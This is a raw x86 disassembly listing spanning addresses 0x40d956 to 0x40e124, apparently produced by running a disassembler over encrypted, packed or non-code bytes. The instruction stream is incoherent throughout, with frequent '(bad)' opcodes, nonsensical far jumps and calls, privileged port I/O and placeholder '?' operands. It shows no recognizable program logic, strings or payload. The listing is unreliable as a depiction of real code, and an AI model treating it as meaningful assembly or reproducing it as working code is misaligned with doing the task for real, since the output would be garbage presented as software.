  40d956:	xor    eax,0xfca15c1b
  40d95b:	jmp    0x15dd3a34
  40d960:	bound  ecx,QWORD PTR [edi-0x7ac8065]
  40d966:	mov    edi,0xe45e9fb8
  40d96b:	imul   ecx,DWORD PTR [esi+edi*2-0x3],0xf456ffe9
  40d973:	sar    dl,cl
  40d975:	xor    BYTE PTR [esi-0x25ae4ac6],0xb2
  40d97c:	pop    ds
  40d97d:	push   ds
  40d97e:	adc    ebx,0xacfa6695
  40d984:	and    DWORD PTR [ebx],0xffffff9e
  40d987:	aad    0xf7
  40d989:	neg    edx
  40d98b:	sub    al,0x70
  40d98d:	xor    esp,DWORD PTR [bp+si-0x6d]
  40d991:	repz push ebx
  40d993:	sub    al,0xa6
  40d995:	cmp    al,BYTE PTR [eax+0x419cdcc4]
  40d99b:	rcr    DWORD PTR [ebx+eiz*1-0x74],cl
  40d99f:	sbb    edx,esp
  40d9a1:	mov    dl,0xcb
  40d9a3:	push   0x4e0e192c
  40d9a8:	shl    ah,0xd2
  40d9ab:	sbb    eax,0x825b23a8
  40d9b0:	sbb    BYTE PTR [edx+0x2b2db77e],bl
  40d9b6:	lods   eax,DWORD PTR ds:[esi]
  40d9b7:	mov    es,WORD PTR [edi+0x2d]
  40d9ba:	fistp  QWORD PTR [eax]
  40d9bc:	xlat   BYTE PTR ds:[ebx]
  40d9bd:	sahf   
  40d9be:	int    0x7d
  40d9c0:	pop    ecx
  40d9c1:	sub    ebx,DWORD PTR [eax-0x7a9b103]
  40d9c7:	mov    eax,ecx
  40d9c9:	shl    DWORD PTR [ebx+0x4f],0xc9
  40d9cd:	in     eax,dx
  40d9ce:	sub    al,0x2d
  40d9d0:	adc    cl,al
  40d9d2:	jb     0x40da30
  40d9d4:	push   ds
  40d9d5:	dec    ebx
  40d9d6:	jne    0x40da21
  40d9d8:	cmp    BYTE PTR [edi+ebx*8+0x55],dh
  40d9dc:	sbb    bl,dh
  40d9de:	ja     0x40da29
  40d9e0:	daa    
  40d9e1:	loopne 0x40d9b2
  40d9e3:	dec    DWORD PTR [esi-0x1045e189]
  40d9e9:	lds    esp,FWORD PTR [ecx-0x614529b4]
  40d9ef:	popf   
  40d9f0:	inc    ecx
  40d9f1:	test   DWORD PTR [esi+eiz*2+0x6e],0xbf94fc52
  40d9f9:	enter  0x30c9,0x37
  40d9fd:	push   edi
  40d9fe:	pop    edi
  40d9ff:	mov    eax,ds:0x74e104d1
  40da04:	mov    edx,0x6e2c19f6
  40da09:	cwde   
  40da0a:	dec    edx
  40da0b:	ins    DWORD PTR es:[edi],dx
  40da0c:	jno    0x40d9ba
  40da0e:	fwait
  40da0f:	mov    bh,0xe3
  40da11:	fld    QWORD PTR [ebx+0x51a9491]
  40da17:	je     0x40da27
  40da19:	or     cl,ah
  40da1b:	scas   eax,DWORD PTR es:[edi]
  40da1c:	nop
  40da1d:	pushf  
  40da1e:	xacquire xchg DWORD PTR [bp+si-0x2d],eax
  40da23:	in     eax,dx
  40da24:	mov    al,ds:0xa5866222
  40da29:	lock push eax
  40da2b:	fisubr WORD PTR [eax]
  40da2d:	add    ebx,ecx
  40da2f:	or     eax,0x59bcdb3d
  40da34:	mov    eax,ds:0xf27035b4
  40da39:	or     cl,BYTE PTR [eax+0xb2cd66f]
  40da3f:	loop   0x40da77
  40da41:	(bad)  
  40da42:	xor    eax,0xec2b2757
  40da47:	sub    BYTE PTR [eax-0x4b],al
  40da4a:	shl    BYTE PTR [ecx+0x22],1
  40da4d:	ret    
  40da4e:	ss xor ch,bh
  40da51:	xchg   esp,eax
  40da52:	mov    ds:0x21632574,eax
  40da57:	xor    eax,0x84029c59
  40da5c:	loopne 0x40daa0
  40da5e:	and    BYTE PTR [edi-0x42],bl
  40da61:	inc    esp
  40da63:	pop    edx
  40da64:	adc    DWORD PTR [ecx+0x3ab99926],0x97bfb29f
  40da6e:	js     0x40da2b
  40da70:	pop    eax
  40da71:	addr16 loopne 0x40dac6
  40da74:	mov    ecx,0xf347e779
  40da79:	mov    ebp,0x5b7278ff
  40da7e:	in     eax,0xef
  40da80:	cwde   
  40da81:	xchg   ebp,eax
  40da82:	out    0x75,eax
  40da84:	leave  
  40da85:	inc    ecx
  40da86:	rol    DWORD PTR [ebx-0x777cf8be],0x1
  40da8d:	xor    BYTE PTR [edi-0x102179a6],bl
  40da93:	and    al,0xce
  40da95:	dec    esi
  40da96:	sub    bh,BYTE PTR ds:0x8fa4823a
  40da9c:	pop    esi
  40da9d:	mov    fs,WORD PTR [ecx+0xf]
  40daa0:	push   es
  40daa1:	dec    ebx
  40daa2:	sub    ebp,edx
  40daa4:	mov    ss,WORD PTR [edi+eiz*2]
  40daa7:	(bad)  
  40daa8:	adc    al,0xa4
  40daaa:	push   es
  40daab:	xor    ah,BYTE PTR [eax+0x31d4ea6e]
  40dab1:	mov    al,0x1d
  40dab3:	repnz inc BYTE PTR [ebp+esi*4+0x5287785e]
  40dabb:	out    dx,eax
  40dabc:	inc    esi
  40dabd:	mov    ch,0x58
  40dabf:	or     BYTE PTR [ebx],0x8c
  40dac2:	xchg   esi,eax
  40dac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dac5:	jb     0x40db44
  40dac7:	push   ecx
  40dac8:	add    esi,DWORD PTR [eax+0xc]
  40dacb:	jo     0x40daee
  40dacd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dace:	xor    DWORD PTR [edx],0x46
  40dad1:	lds    ecx,FWORD PTR [esi]
  40dad3:	and    eax,0x91c5caba
  40dad8:	inc    edi
  40dad9:	xor    esi,DWORD PTR ds:0x7a8d7be9
  40dadf:	loop   0x40da95
  40dae1:	mov    cl,0xdd
  40dae3:	mov    eax,0xd4e2f09c
  40dae8:	add    eax,0x747d3f64
  40daed:	rcr    BYTE PTR [edi-0x2],0x20
  40daf1:	dec    ebx
  40daf2:	jae    0x40dabc
  40daf4:	fld    TBYTE PTR [esi-0x7de95525]
  40dafa:	stos   DWORD PTR es:[edi],eax
  40dafb:	shl    eax,1
  40dafd:	setnp  BYTE PTR [edi]
  40db00:	das    
  40db01:	popf   
  40db02:	int3   
  40db03:	stos   BYTE PTR es:[edi],al
  40db04:	push   ds
  40db05:	jecxz  0x40db81
  40db07:	pushf  
  40db08:	call   0x569c:0xc6318fe7
  40db0f:	int    0x91
  40db11:	add    ah,BYTE PTR [edi+0xf]
  40db14:	adc    edi,DWORD PTR ss:[ecx-0x11]
  40db18:	imul   edx,DWORD PTR [ebp+0x7253ff5],0x91390f70
  40db22:	sbb    bl,BYTE PTR [ebx+eax*1-0x33]
  40db26:	fdivr  st,st(7)
  40db28:	xor    DWORD PTR [esi],esi
  40db2a:	pop    ecx
  40db2b:	fidiv  WORD PTR [edx-0x9]
  40db2e:	adc    bl,BYTE PTR [esi+0x20]
  40db31:	cli    
  40db32:	aas    
  40db33:	add    dh,al
  40db35:	fimul  WORD PTR [edi-0x43]
  40db38:	dec    ecx
  40db39:	imul   esi,ecx,0xffffff8a
  40db3c:	sub    al,0xf4
  40db3e:	std    
  40db3f:	in     eax,dx
  40db40:	or     esp,DWORD PTR [edx+0x62]
  40db43:	cdq    
  40db44:	mov    ds:0x874cbee0,al
  40db49:	iret   
  40db4a:	ficom  WORD PTR [ebp+0xf4891d]
  40db50:	gs cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db53:	pop    ss
  40db54:	mov    ecx,0x50463508
  40db59:	repz cmp eax,0xe7b63ad5
  40db5f:	leave  
  40db60:	and    ecx,0x7c
  40db63:	mov    esp,0x1f32c293
  40db68:	iret   
  40db69:	fiadd  WORD PTR [ebx]
  40db6b:	aam    0x48
  40db6d:	dec    edi
  40db6e:	in     eax,0x3f
  40db70:	dec    esp
  40db71:	aas    
  40db72:	jle    0x40db07
  40db74:	mov    DWORD PTR [esi+0x1d],edx
  40db77:	pop    ebx
  40db78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db79:	pop    esp
  40db7a:	and    ah,cl
  40db7c:	int3   
  40db7d:	jnp    0x40db6c
  40db7f:	jmp    0x40dbe4
  40db81:	mov    dl,0x17
  40db83:	test   eax,0xd777e314
  40db88:	sub    BYTE PTR cs:[ebp-0x52f85d82],dl
  40db8f:	das    
  40db90:	add    BYTE PTR [edi],dl
  40db92:	mov    ?,esp
  40db94:	rol    esp,cl
  40db96:	push   ecx
  40db97:	sbb    DWORD PTR [ebp+0x1419a961],esi
  40db9d:	sub    BYTE PTR [edx],al
  40db9f:	ja     0x40dc0c
  40dba1:	hlt    
  40dba2:	fbld   TBYTE PTR [edx]
  40dba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dba5:	lods   eax,DWORD PTR ds:[esi]
  40dba6:	xchg   ebp,eax
  40dba7:	int3   
  40dba8:	sub    dh,dh
  40dbaa:	jmp    0xed663854
  40dbaf:	mov    ebx,0x58a7f97e
  40dbb4:	and    al,0x80
  40dbb6:	sub    ah,dl
  40dbb8:	pushf  
  40dbb9:	pop    ebx
  40dbba:	fdiv   QWORD PTR [eax+0x7f819d86]
  40dbc0:	inc    ecx
  40dbc1:	jmp    0x40db6a
  40dbc3:	not    DWORD PTR [edi]
  40dbc5:	inc    ecx
  40dbc6:	or     ah,dl
  40dbc8:	pop    eax
  40dbc9:	std    
  40dbca:	enter  0x6ca3,0xc8
  40dbce:	mov    ebp,0xb94875ac
  40dbd3:	jne    0x40dc53
  40dbd5:	lahf   
  40dbd6:	mov    edx,0x941bae13
  40dbdb:	mov    ebp,0xd2085417
  40dbe0:	cwde   
  40dbe1:	test   eax,0x8ff05f40
  40dbe6:	push   esi
  40dbe7:	mov    ebx,0xe283471a
  40dbec:	(bad)  
  40dbee:	push   ebx
  40dbef:	or     ebp,DWORD PTR [ebp-0x63]
  40dbf2:	sub    esp,DWORD PTR [esi-0x1f]
  40dbf5:	xchg   esi,eax
  40dbf6:	cmp    eax,0xbef340d8
  40dbfb:	cdq    
  40dbfc:	mov    WORD PTR [esp+eax*4],?
  40dbff:	sbb    cl,bh
  40dc01:	cs jg  0x40dc2a
  40dc04:	fistp  WORD PTR [edi-0x1becfda4]
  40dc0a:	inc    eax
  40dc0b:	jo     0x40dc36
  40dc0d:	cwde   
  40dc0e:	mov    edx,0xb9b3c96b
  40dc13:	jge    0x40dba7
  40dc15:	mov    al,ds:0x67d5a29b
  40dc1a:	ss jb  0x40dba6
  40dc1d:	fwait
  40dc1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1f:	inc    esi
  40dc20:	add    esp,DWORD PTR [eax+eax*1+0x67cc903a]
  40dc27:	jecxz  0x40dc75
  40dc29:	cmp    eax,DWORD PTR [ebx-0x13d63836]
  40dc2f:	int3   
  40dc30:	mov    eax,0xacc39f77
  40dc35:	lahf   
  40dc36:	or     ah,BYTE PTR [esp+eiz*2-0x1831113e]
  40dc3d:	xchg   ebx,eax
  40dc3e:	xchg   ebp,eax
  40dc3f:	int3   
  40dc40:	push   cs
  40dc41:	add    eax,0x84b2b9c6
  40dc46:	mov    DWORD PTR [edx+0x53],edx
  40dc49:	fwait
  40dc4a:	test   al,0x94
  40dc4c:	sbb    DWORD PTR [ecx-0x33d7a9f0],edi
  40dc52:	sub    DWORD PTR [edi],ebp
  40dc54:	mov    bl,0x78
  40dc56:	jmp    0xdf19:0x8712efed
  40dc5d:	mov    ebp,DWORD PTR [edx-0xc]
  40dc60:	xor    DWORD PTR [eax+0x137e121c],0xffffffa0
  40dc67:	mov    ch,0x33
  40dc69:	sub    eax,0x6b4411e5
  40dc6e:	shl    BYTE PTR [esi+0x49356ad1],1
  40dc74:	call   0xac5e800a
  40dc79:	stos   BYTE PTR es:[edi],al
  40dc7a:	dec    edx
  40dc7b:	mov    edi,0x3a897546
  40dc80:	jnp    0x40dcf7
  40dc82:	mov    ch,0xd2
  40dc84:	fisubr WORD PTR [edi-0xaf9212b]
  40dc8a:	into   
  40dc8b:	or     BYTE PTR [esi],0xcf
  40dc8e:	xor    al,0xb1
  40dc90:	sar    BYTE PTR [ebx-0x147670e9],0xbb
  40dc97:	sub    eax,0x92176ddf
  40dc9c:	mov    esp,0x4155cf5c
  40dca1:	add    ebp,ebx
  40dca3:	outs   dx,DWORD PTR ds:[esi]
  40dca4:	push   ebp
  40dca5:	xlat   BYTE PTR ds:[ebx]
  40dca6:	stos   BYTE PTR es:[edi],al
  40dca7:	pop    esp
  40dca8:	aam    0x87
  40dcaa:	clc    
  40dcab:	inc    esi
  40dcac:	ss mov esp,0x85c59cd9
  40dcb2:	aad    0x2
  40dcb4:	cld    
  40dcb5:	push   edi
  40dcb6:	test   al,0x1c
  40dcb8:	call   0xbd07:0xf599404c
  40dcbf:	retf   0xafd3
  40dcc2:	inc    ebx
  40dcc3:	jl     0x40dcc6
  40dcc5:	je     0x40dce1
  40dcc7:	data16 lahf 
  40dcc9:	shl    DWORD PTR [esi-0x408f5268],cl
  40dccf:	xor    BYTE PTR [edi],al
  40dcd1:	sbb    edi,DWORD PTR [edi+0x479ddad]
  40dcd7:	mov    eax,ds:0xf5f6a8a7
  40dcdc:	stos   BYTE PTR es:[edi],al
  40dcdd:	xchg   BYTE PTR ds:0xaf317874,ah
  40dce3:	call   FWORD PTR [esi]
  40dce5:	ja     0x40dcad
  40dce7:	cld    
  40dce8:	shl    eax,cl
  40dcea:	cli    
  40dceb:	aas    
  40dcec:	inc    esp
  40dced:	(bad)  
  40dcee:	aam    0xf4
  40dcf0:	aam    0xb6
  40dcf2:	sub    BYTE PTR [esp+eax*1+0x52],dl
  40dcf6:	jo     0x40dcf2
  40dcf8:	pop    edi
  40dcf9:	call   0xdb04:0x8ccb3f42
  40dd00:	(bad)  
  40dd01:	addr16 inc edx
  40dd03:	xor    eax,0x7356ed89
  40dd08:	(bad)  
  40dd09:	pop    esp
  40dd0a:	add    esp,DWORD PTR [esi]
  40dd0c:	fcom   st(3)
  40dd0e:	xchg   esi,eax
  40dd0f:	add    BYTE PTR [edx+eax*2],bl
  40dd12:	mov    ebx,0xcaa4c8c2
  40dd17:	add    ebx,edx
  40dd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd1a:	jne    0x40dd6f
  40dd1c:	ins    BYTE PTR es:[edi],dx
  40dd1d:	call   0xa0cc0d01
  40dd22:	mov    edx,0xff102e99
  40dd27:	les    esi,FWORD PTR [ebp+0x16d67e2d]
  40dd2d:	mov    al,ds:0x107b355
  40dd32:	adc    al,0xe6
  40dd34:	leave  
  40dd35:	or     esp,edx
  40dd37:	inc    esi
  40dd38:	xor    al,0x90
  40dd3a:	cdq    
  40dd3b:	gs ins DWORD PTR es:[edi],dx
  40dd3d:	jmp    0x40dd33
  40dd3f:	sbb    edi,DWORD PTR [ebp-0x1f]
  40dd42:	aaa    
  40dd43:	xor    al,0x3c
  40dd45:	sub    edi,ebp
  40dd47:	xor    BYTE PTR [ebp+0x79eef12f],bh
  40dd4d:	lahf   
  40dd4e:	dec    ebp
  40dd4f:	in     al,dx
  40dd50:	(bad)  
  40dd51:	mov    edi,0x672f49
  40dd56:	push   esi
  40dd57:	fcmovnb st,st(2)
  40dd59:	adc    al,0x42
  40dd5b:	aaa    
  40dd5c:	out    dx,al
  40dd5d:	add    DWORD PTR [esi+0x72b11dd0],esi
  40dd63:	mov    edi,0x9a19f83e
  40dd68:	ret    0x42a7
  40dd6b:	in     al,0x6e
  40dd6d:	retf   
  40dd6e:	js     0x40dde8
  40dd70:	dec    ebx
  40dd71:	iret   
  40dd72:	push   0x50d570b0
  40dd77:	jnp    0x40dcf9
  40dd79:	test   DWORD PTR [ebx+0x2312f3c2],0x5a931aee
  40dd83:	sub    DWORD PTR [eax],esi
  40dd85:	dec    ebx
  40dd86:	jg     0x40dda7
  40dd88:	jae    0x40dd4e
  40dd8a:	cli    
  40dd8b:	ret    0x497c
  40dd8e:	int    0x20
  40dd90:	add    DWORD PTR [eax+ebx*1-0x4d],0x61eeccd0
  40dd98:	mov    dh,0xdf
  40dd9a:	cmp    ebx,esi
  40dd9c:	cmp    BYTE PTR [ecx],dl
  40dd9e:	or     ah,BYTE PTR [edx-0xb7087ce]
  40dda4:	inc    esp
  40dda5:	mov    WORD PTR [edi],es
  40dda7:	data16 imul dl
  40ddaa:	jmp    0x7d26:0x84977062
  40ddb1:	jge    0x40de0c
  40ddb3:	cmp    edx,ebx
  40ddb5:	adc    edi,DWORD PTR [ebx+0x26]
  40ddb8:	fwait
  40ddb9:	push   cs
  40ddba:	xchg   edi,eax
  40ddbb:	xor    cl,BYTE PTR [edx-0x7f]
  40ddbe:	add    BYTE PTR [edi+esi*4+0x17a8672a],0xb6
  40ddc6:	push   esi
  40ddc7:	scas   al,BYTE PTR es:[edi]
  40ddc8:	(bad)
  40ddcc:	(bad)  
  40ddcd:	scas   al,BYTE PTR es:[edi]
  40ddce:	js     0x40de0e
  40ddd0:	inc    DWORD PTR [eax-0x34]
  40ddd3:	js     0x40de49
  40ddd5:	cmc    
  40ddd6:	dec    edx
  40ddd7:	lods   eax,DWORD PTR ds:[esi]
  40ddd8:	dec    ecx
  40ddd9:	jbe    0x40dd89
  40dddb:	adc    al,0x67
  40dddd:	or     eax,0x6de3b5f4
  40dde2:	cmp    eax,0x808aa092
  40dde7:	pop    ds
  40dde8:	icebp  
  40dde9:	or     eax,0x41d0eb6c
  40ddee:	ds (bad) 
  40ddf0:	shl    BYTE PTR [esi+0x78],cl
  40ddf3:	mov    cs,WORD PTR [esi+ebp*4]
  40ddf6:	dec    ebp
  40ddf7:	(bad)  [ebx]
  40ddf9:	cmp    ch,ah
  40ddfb:	jp     0x40de70
  40ddfd:	jmp    DWORD PTR ds:0x735dab2
  40de03:	jno    0x40de41
  40de05:	out    dx,al
  40de06:	adc    bl,BYTE PTR [edx-0x4f]
  40de09:	test   al,0xb0
  40de0b:	jecxz  0x40ddf5
  40de0d:	iret   
  40de0e:	cmp    DWORD PTR [ebp+0x3982ba14],ebp
  40de14:	mov    dh,0x42
  40de16:	adc    DWORD PTR [ecx],eax
  40de18:	pushf  
  40de19:	mov    bh,0x64
  40de1b:	add    esi,DWORD PTR [esi]
  40de1d:	cmp    cl,bh
  40de1f:	mov    al,ds:0x36da5fbc
  40de24:	sahf   
  40de25:	out    0x6a,eax
  40de27:	sub    al,0x5f
  40de29:	and    al,0x55
  40de2b:	jecxz  0x40de93
  40de2d:	xchg   ebx,eax
  40de2e:	inc    ebp
  40de2f:	inc    ebx
  40de30:	mov    dh,0xc6
  40de32:	xor    edi,esi
  40de34:	fs and ecx,ebx
  40de37:	dec    esi
  40de38:	mov    dh,0xe3
  40de3a:	adc    DWORD PTR [edx-0x5e],ecx
  40de3d:	lock addr16 (bad) 
  40de40:	mov    dl,0xba
  40de42:	aam    0x63
  40de44:	imul   ecx
  40de46:	ins    DWORD PTR es:[edi],dx
  40de47:	bound  edx,QWORD PTR [eax+0x35b6f4a0]
  40de4d:	repz and dh,bl
  40de50:	imul   BYTE PTR [ecx]
  40de52:	mov    ebx,0xe2b01d2f
  40de57:	repz lea esp,[ecx+0x2709e1b8]
  40de5e:	pop    esi
  40de5f:	cli    
  40de60:	ds daa 
  40de62:	test   al,0x28
  40de64:	pop    ds
  40de65:	inc    esi
  40de66:	and    al,0xf3
  40de68:	stos   BYTE PTR es:[edi],al
  40de69:	and    eax,0x383241b5
  40de6e:	and    eax,0x77300cdf
  40de73:	in     al,0xa5
  40de75:	and    esp,DWORD PTR [ecx-0x72]
  40de78:	inc    edx
  40de79:	mov    eax,ds:0xbf626832
  40de7e:	aad    0x74
  40de80:	push   edi
  40de81:	xor    eax,0x41900c57
  40de86:	fild   WORD PTR [eax-0x50d220e8]
  40de8c:	push   edi
  40de8d:	mov    esp,0xb9946086
  40de92:	xor    DWORD PTR [eax+eiz*1-0x42fdb12],ebx
  40de99:	dec    ecx
  40de9a:	xchg   esi,eax
  40de9b:	js     0x40defe
  40de9d:	and    BYTE PTR [eax+0x46],al
  40dea0:	add    eax,0x52ab6181
  40dea5:	and    DWORD PTR [edx+eiz*4-0x513c0be0],0x3e48cee
  40deb0:	jg     0x40de77
  40deb2:	adc    dh,0xb7
  40deb5:	fsubr  st,st(6)
  40deb7:	or     eax,0x27435f74
  40debc:	push   esp
  40debd:	aad    0x1e
  40debf:	addr16 dec edx
  40dec1:	in     al,0x9e
  40dec3:	push   ds
  40dec4:	mov    eax,ds:0xc34028e9
  40dec9:	mov    edi,0x3fe7fbd4
  40dece:	je     0x40dea2
  40ded0:	addr16 in al,0xd2
  40ded3:	add    al,BYTE PTR [ebx-0x43b009d9]
  40ded9:	scas   eax,DWORD PTR es:[edi]
  40deda:	(bad)  
  40dedb:	aas    
  40dedc:	retf   0x9e2b
  40dedf:	push   esp
  40dee0:	fnstenv [ecx-0x637d9268]
  40dee6:	xor    al,0x26
  40dee8:	push   0xe39172df
  40deed:	xlat   BYTE PTR ds:[ebx]
  40deee:	xor    al,0x86
  40def0:	sar    DWORD PTR [edx-0x9],1
  40def3:	and    eax,0xffffffa3
  40def6:	jb     0x40df6d
  40def8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40def9:	jg     0x40ded8
  40defb:	nop
  40defc:	cmp    BYTE PTR [ecx+eax*2+0x1ec2e4cb],ah
  40df03:	xchg   esi,eax
  40df04:	test   al,0x2c
  40df06:	inc    edx
  40df07:	cli    
  40df08:	jmp    FWORD PTR [edi+0x20]
  40df0b:	xchg   BYTE PTR [esi-0x78df1bbc],al
  40df11:	adc    BYTE PTR [esi-0x29],0x43
  40df15:	and    eax,0x3b92cfa8
  40df1a:	pop    ds
  40df1b:	hlt    
  40df1c:	jmp    0x7d3d:0x3c20b539
  40df23:	dec    edi
  40df24:	jge    0x40deff
  40df26:	cmp    ecx,DWORD PTR [ecx+0x61e99683]
  40df2c:	into   
  40df2d:	push   cs
  40df2e:	ja     0x40df4d
  40df30:	out    dx,al
  40df31:	out    dx,eax
  40df32:	push   0xffffffa0
  40df34:	jg     0x40df12
  40df36:	test   DWORD PTR [esi+0x59],eax
  40df39:	or     cl,bl
  40df3b:	push   ds
  40df3c:	xor    DWORD PTR [ebx+0x6d],ebx
  40df3f:	pushf  
  40df40:	xchg   ebp,eax
  40df41:	lds    ebp,FWORD PTR [edx+0x7b1bb16d]
  40df47:	jo     0x40df30
  40df49:	in     al,0xb6
  40df4b:	rcl    BYTE PTR [ebx],0x35
  40df4e:	inc    ebx
  40df4f:	(bad)  
  40df50:	aad    0x9d
  40df52:	mov    al,dh
  40df54:	pop    ss
  40df55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df56:	scas   al,BYTE PTR es:[edi]
  40df57:	(bad)  
  40df58:	test   DWORD PTR ds:0x461d1c7f,0x3f7ebb9f
  40df62:	retf   0x906e
  40df65:	das    
  40df66:	push   ss
  40df67:	pop    ds
  40df68:	add    bh,BYTE PTR [edi-0x2f29de47]
  40df6e:	fwait
  40df6f:	dec    esi
  40df70:	call   0x82525c1d
  40df75:	push   0xa6d387db
  40df7a:	lods   eax,DWORD PTR ds:[esi]
  40df7b:	sbb    al,0x7b
  40df7d:	inc    ebp
  40df7e:	jge    0x40df56
  40df80:	jl     0x40df77
  40df82:	rcr    BYTE PTR [esi],1
  40df84:	pop    ds
  40df85:	cmp    esp,ebx
  40df87:	add    edi,DWORD PTR [eax-0x588c8f86]
  40df8d:	retf   0x7109
  40df90:	adc    al,0x5f
  40df92:	xchg   ecx,eax
  40df93:	cli    
  40df94:	sub    bh,BYTE PTR [edx]
  40df96:	imul   esi,DWORD PTR [edx+0x31187489],0xf75885c9
  40dfa0:	iret   
  40dfa1:	fwait
  40dfa2:	adc    ecx,edx
  40dfa4:	xchg   ebp,eax
  40dfa5:	jle    0x40dfd3
  40dfa7:	aad    0xe6
  40dfa9:	ror    DWORD PTR [ebp+0x11],0x12
  40dfad:	fmul   DWORD PTR [edi-0x2e]
  40dfb0:	icebp  
  40dfb1:	cld    
  40dfb2:	dec    edx
  40dfb3:	adc    BYTE PTR [eax],bh
  40dfb5:	sbb    DWORD PTR [ebx],ebx
  40dfb7:	sbb    al,0xd2
  40dfb9:	mov    ecx,0xe10cd6e3
  40dfbe:	inc    esp
  40dfbf:	test   al,0x5c
  40dfc1:	xor    BYTE PTR [ebp+0x527dc7c4],0xef
  40dfc8:	add    BYTE PTR [ecx+0x3c],ch
  40dfcb:	loope  0x40dfa8
  40dfcd:	push   edi
  40dfce:	jbe    0x40dfe6
  40dfd0:	retf   0x4cca
  40dfd3:	stos   DWORD PTR es:[edi],eax
  40dfd4:	sub    BYTE PTR [ebp+0x2f],al
  40dfd7:	icebp  
  40dfd8:	fimul  WORD PTR [ecx+0x69]
  40dfdb:	mov    ds:0xf611c318,al
  40dfe0:	enter  0x181d,0xc5
  40dfe4:	jle    0x40dfea
  40dfe6:	ins    BYTE PTR es:[edi],dx
  40dfe7:	push   DWORD PTR [ecx-0xfc8fd68]
  40dfed:	jmp    0x40e051
  40dfef:	sub    ebx,DWORD PTR [ebx]
  40dff1:	fbld   TBYTE PTR [ecx-0x3c]
  40dff4:	mov    ch,0x34
  40dff6:	repnz mov ah,0xb3
  40dff9:	push   ss
  40dffa:	sbb    eax,0xf19be7be
  40dfff:	sub    bh,ah
  40e001:	js     0x40e01c
  40e003:	mov    ecx,0x93f0e6ae
  40e008:	mov    esp,0x161104a3
  40e00d:	push   ecx
  40e00e:	pop    esi
  40e00f:	imul   esi,DWORD PTR [eax+0x15],0x4eadfc2c
  40e016:	add    esp,DWORD PTR [esi-0x530f8f4a]
  40e01c:	call   DWORD PTR [ebx+edi*1-0x7a]
  40e020:	push   ds
  40e021:	jo     0x40e016
  40e023:	xchg   BYTE PTR [edi],ah
  40e025:	sbb    ch,al
  40e027:	jecxz  0x40e086
  40e029:	rep stos DWORD PTR es:[edi],eax
  40e02b:	fld    TBYTE PTR [ebp-0x6d]
  40e02e:	mov    esp,0x240e84b9
  40e033:	ret    0x2e8c
  40e036:	imul   esp,DWORD PTR [ecx-0x4fcc546f],0x780e18c9
  40e040:	int    0x27
  40e042:	and    eax,0x7b6405d
  40e047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e048:	cmp    dh,BYTE PTR [eax]
  40e04a:	cld    
  40e04b:	bound  edi,QWORD PTR [ebx]
  40e04d:	int3   
  40e04e:	adc    al,0x86
  40e050:	xchg   ebx,eax
  40e051:	les    esi,FWORD PTR [edx-0x51c28333]
  40e057:	mov    dh,0x23
  40e059:	(bad)  
  40e05a:	push   esp
  40e05b:	ds pop ss
  40e05d:	xor    al,0x32
  40e05f:	jb     0x40e08d
  40e061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e062:	aas    
  40e063:	sub    esp,ebp
  40e065:	fstp   QWORD PTR [ebp+edx*1-0x3e]
  40e069:	fs dec esi
  40e06b:	push   ds
  40e06c:	xchg   ecx,eax
  40e06d:	shl    DWORD PTR [eax-0x70f568df],cl
  40e073:	jnp    0x40e0a0
  40e075:	in     al,dx
  40e076:	xor    bh,cl
  40e078:	inc    esp
  40e079:	(bad)  
  40e07b:	xor    al,0xd0
  40e07d:	lea    edi,[esi+0x67c6edab]
  40e083:	shl    DWORD PTR [esi-0x24303086],1
  40e089:	and    DWORD PTR [ecx+0x50e2d157],ebx
  40e08f:	jmp    0x40e013
  40e091:	cdq    
  40e092:	mov    edx,0xed9bbe6e
  40e097:	ins    BYTE PTR es:[edi],dx
  40e098:	out    0x4a,eax
  40e09a:	inc    ecx
  40e09b:	add    eax,0xfedba5fe
  40e0a0:	sahf   
  40e0a1:	cmp    al,0xd7
  40e0a3:	mov    eax,0x5652dedd
  40e0a8:	xchg   edx,eax
  40e0a9:	fdivr  st,st(7)
  40e0ab:	mov    eax,0x2dd6844d
  40e0b0:	mov    ecx,0x846fac46
  40e0b5:	jp     0x40e083
  40e0b7:	(bad)  
  40e0b8:	push   eax
  40e0b9:	mov    fs,WORD PTR [edx-0x73]
  40e0bc:	inc    ebp
  40e0bd:	repz cmp BYTE PTR [ebx-0x52150910],cl
  40e0c4:	pusha  
  40e0c5:	and    ch,cl
  40e0c7:	jl     0x40e0ff
  40e0c9:	pop    ecx
  40e0ca:	mov    esi,0x853efa02
  40e0cf:	lahf   
  40e0d0:	mov    dh,0x72
  40e0d2:	test   DWORD PTR [edx],eax
  40e0d4:	or     ebp,ebp
  40e0d6:	inc    ecx
  40e0d7:	cmp    al,0xde
  40e0d9:	push   ds
  40e0da:	lock mov esi,cs
  40e0dd:	in     eax,dx
  40e0de:	push   es
  40e0df:	pop    ss
  40e0e0:	pop    edx
  40e0e1:	add    eax,0x4080f6a6
  40e0e6:	push   eax
  40e0e7:	xchg   edi,eax
  40e0e8:	cli    
  40e0e9:	fisubr WORD PTR ds:0x4a479464
  40e0ef:	mov    ah,0xba
  40e0f1:	or     DWORD PTR [eax+0x6f],edx
  40e0f4:	cmp    bl,dl
  40e0f6:	and    BYTE PTR [eax+0x6b],0xcf
  40e0fa:	popa   
  40e0fb:	sub    ebx,esi
  40e0fd:	lea    ebp,[ebx]
  40e0ff:	pop    ds
  40e100:	pop    es
  40e101:	mov    bl,0x8d
  40e103:	dec    esp
  40e104:	lods   eax,DWORD PTR ds:[esi]
  40e105:	xchg   esi,eax
  40e106:	jo     0x40e143
  40e108:	push   ss
  40e109:	in     eax,0x5a
  40e10b:	jge    0x40e0e6
  40e10d:	rol    dh,0xd5
  40e110:	js     0x40e0c4
  40e112:	add    al,0x2f
  40e114:	fistp  QWORD PTR ds:0xb8a78ed
  40e11a:	jne    0x40e112
  40e11c:	es cmp al,0x51
  40e11f:	mov    ebp,0x29c5a4a5
  40e124:	sbb    eax,0xb4dfc8c
